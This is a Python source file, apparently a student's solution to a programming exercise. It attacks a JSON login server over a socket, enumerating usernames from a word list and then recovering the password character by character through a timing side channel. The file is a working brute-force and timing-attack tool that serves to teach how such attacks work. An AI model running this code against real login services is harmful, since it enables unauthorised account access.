# write your code here
import socket
import sys
import itertools
import os
import json
import string
import time


# Stage 4 Tests


def obtain_address():
    # Obtaining relevant network information from CLI
    args = sys.argv
    address = (args[1], int(args[2]))
    return address


def socket_connection(address):
    authentication = {"login": "", "password": " "}
    uname = False
    pwd = False
    ref_string = (string.digits + string.ascii_letters)

    # Establishing connection with local host
    with socket.socket() as client_socket:
        client_socket.connect(address)

        txt_value = login_return()

        # Step 1: Attempting to get the right username
        for username in txt_value:

            authentication["login"] = username
            data = json.dumps(authentication).encode()
            client_socket.send(data)
            response = client_socket.recv(1024).decode()
            output = json.loads(response)

            if output["result"] == "Wrong password!":
                uname = True
                break

        test = ""

        # # Step 2: Calculate reference time for incorrect password
        # data = json.dumps(authentication).encode()
        # start_time = time.perf_counter()
        # client_socket.send(data)
        # client_socket.recv(1024).decode()
        # end_time = time.perf_counter()
        # ref_time = end_time - start_time

        # Step 3: Generating different password permutations for the right username
        if uname:
            for i in range(30):

                for j in range(len(ref_string)):
                    test2 = test + ref_string[j]

                    authentication["password"] = test2
                    data = json.dumps(authentication).encode()
                    start_time = time.perf_counter()
                    client_socket.send(data)
                    response = client_socket.recv(1024).decode()
                    end_time = time.perf_counter()
                    output = json.loads(response)
                    check_time = end_time - start_time

                    # Take a print out of the different time checks and identify the highest durations
                    # Filter out the low durations out (e-05 type)
                    # I did use the hint, but I validated with excel - used a graph to see the time difference
                    # print(check_time)

                    if check_time > 0.1:
                        test = test2
                        break

                    elif output["result"] == "Connection success!":
                        test = test2
                        pwd = True
                        break

                if pwd:
                    break

        return output["result"], authentication


def password_return():
    for row in open(os.path.join(os.path.dirname(__file__), 'passwords.txt'), "r"):
        my_iter = itertools.product(*([letter.lower(), letter.upper()] for letter in row.strip()))
        for value in my_iter:
            yield ''.join(c for c in value)


def login_return():
    for row in open(os.path.join(os.path.dirname(__file__), 'logins.txt'), "r"):
        yield row.strip()


if __name__ == "__main__":
    config_address = obtain_address()
    outcome, found_pwd = socket_connection(config_address)
    print(json.dumps(found_pwd) if outcome == "Connection success!" else "Unsuccessful connection")
